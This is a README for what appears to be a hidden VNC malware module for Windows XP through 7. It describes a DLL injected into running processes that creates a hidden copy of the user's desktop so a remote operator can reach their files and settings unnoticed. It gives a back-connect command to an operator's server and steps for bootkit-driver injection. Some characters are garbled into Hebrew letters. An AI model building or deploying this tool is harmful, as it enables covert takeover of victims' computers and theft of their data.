VNC-module
----------

This program allows you to connect remotely to the desktop of the currently logged in user.
Allows to create a copy of user's desktop and interact with it using RFB protocol.
This protocol supports most of VNC clients, for example: RealVNC, UltraVNC, TightVNC.
The program can work in waiting-to-connect or Back-Connect(establishes connection to a predefined server) modes.

OS support: Windows XP - Windows 7 SP1.
Supported architectures: ץ86, ץ64.

The program is implemented as a dynamic library(DLL) that is injected into one of the active processes.
When a connection is established, the program creates a hidden copy of user's desktop and starts EXPLORER.EXE.
In this way, you gain access to the exact copy of the desktop of currently active user. Remotely connected user
gets access to all of the files, profile and settings(if they are not blocked by any currently running processes)
of the locally logged in user, but does not interfer with user's work and stays completely hidden. 

The following files are produced after the build:
 VNCDLL.DLL		- 32bit(including WOW64) application module;
 VNCDLL64.DLL	- 64bit(including WOW64) application module;
 TESTVNC.EXE	- test program - loads VNC-module;
 
Running the application:
 TESTVNC			- launches the application waiting for connections on port 5900 - default port
 TESTVNC <PORT>		- launches the application waiting for connections on a specified port
 TESTVNC <IP:PORT>	- launches the application in Back-Connect mode. where IP:PORT is the IP address and port of Back-Connect server.
 
How VNC works when VNCDLL is injected from Bootkit driver
---------------------------------------------

1. You have to disable internal injection mechanism. To do that, uncomment the following line in inc\main.h:
	#define	_KERNEL_MODE_INJECT		TRUE

2. Specify listening TCP/IP port. The port is assigned by the following parameter
	RFB_DEFAULT_SERVER_PORT ג פאיכו inc\rfb.h

3. The DDL files have to have the following names: VNCDLL.DLL for 32bit and VNCDLL64.DLL for 64bit!